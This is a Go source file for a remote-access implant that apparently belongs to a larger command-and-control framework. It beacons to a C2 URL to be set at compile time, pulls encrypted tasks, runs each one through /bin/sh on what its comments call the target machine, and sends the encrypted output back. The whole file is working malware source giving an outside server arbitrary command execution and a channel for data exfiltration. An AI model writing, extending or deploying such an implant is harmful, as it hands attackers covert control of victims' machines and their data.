package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"time"
)

// C2_URL is the URL of the Command & Control server.
// This value will be injected at compile time.
var C2_URL = "http://localhost:8000/c2/implant/callback"
var AgentID = "default_agent"
var EncryptionKey = "_THIS_IS_A_DEFAULT_32_BYTE_KEY_"

// Task represents a command received from the C2.
type Task struct {
	ID      string `json:"id"`
	Command string `json:"command"`
}

// TaskResult represents the result of an executed command.
type TaskResult struct {
	TaskID string `json:"task_id"`
	Output string `json:"output"`
}

// EncryptedPayload is a generic wrapper for encrypted data.
type EncryptedPayload struct {
	Data string `json:"data"`
}

func main() {
	// Infinite loop to periodically contact the C2 (beaconing).
	for {
		// Request a new task from the C2.
		task, err := getTask()
		if err != nil {
			fmt.Println("Error getting task:", err)
			time.Sleep(30 * time.Second) // Wait before retrying on error.
			continue
		}

		// If no task is available, wait before asking again.
		if task.Command == "" {
			time.Sleep(10 * time.Second)
			continue
		}

		// Execute the task.
		output := executeCommand(task.Command)

		// Send the result to the C2.
		sendResult(TaskResult{TaskID: task.ID, Output: output})
	}
}

// getTask contacts the C2 to get a new task.
func getTask() (*Task, error) {
	client := &http.Client{}
	req, err := http.NewRequest("GET", C2_URL, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("X-Agent-ID", AgentID)
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	// The body is encrypted, so we decrypt it.
	var encryptedPayload EncryptedPayload
	if err := json.Unmarshal(body, &encryptedPayload); err != nil {
		// If the payload is not encrypted JSON, it might be an unencrypted "no task" response.
		var task Task
		if json.Unmarshal(body, &task) == nil && task.Command == "" {
			return &task, nil
		}
		return nil, fmt.Errorf("error unmarshalling payload: %v", err)
	}

	decryptedData, err := Decrypt(encryptedPayload.Data, []byte(EncryptionKey))
	if err != nil {
		return nil, fmt.Errorf("error decrypting task: %v", err)
	}

	var task Task
	err = json.Unmarshal(decryptedData, &task)
	if err != nil {
		return nil, fmt.Errorf("error unmarshalling decrypted task: %v", err)
	}

	return &task, nil
}

// executeCommand executes a shell command on the target machine.
func executeCommand(command string) string {
	cmd := exec.Command("/bin/sh", "-c", command)
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return fmt.Sprintf("Error executing command: %s\n%s", err, out.String())
	}

	return out.String()
}

// sendResult sends the task result to the C2.
func sendResult(result TaskResult) {
	jsonData, err := json.Marshal(result)
	if err != nil {
		fmt.Println("Error marshalling result:", err)
		return
	}

	// Encrypt the result
	encryptedData, err := Encrypt(jsonData, []byte(EncryptionKey))
	if err != nil {
		fmt.Println("Error encrypting result:", err)
		return
	}

	// Prepare the encrypted payload
	payload := EncryptedPayload{Data: encryptedData}
	encryptedPayloadBytes, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("Error marshalling encrypted payload:", err)
		return
	}

	client := &http.Client{}
	req, err := http.NewRequest("POST", C2_URL, bytes.NewBuffer(encryptedPayloadBytes))
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Agent-ID", AgentID)

	_, err = client.Do(req)
	if err != nil {
		fmt.Println("Error sending result:", err)
	}
}
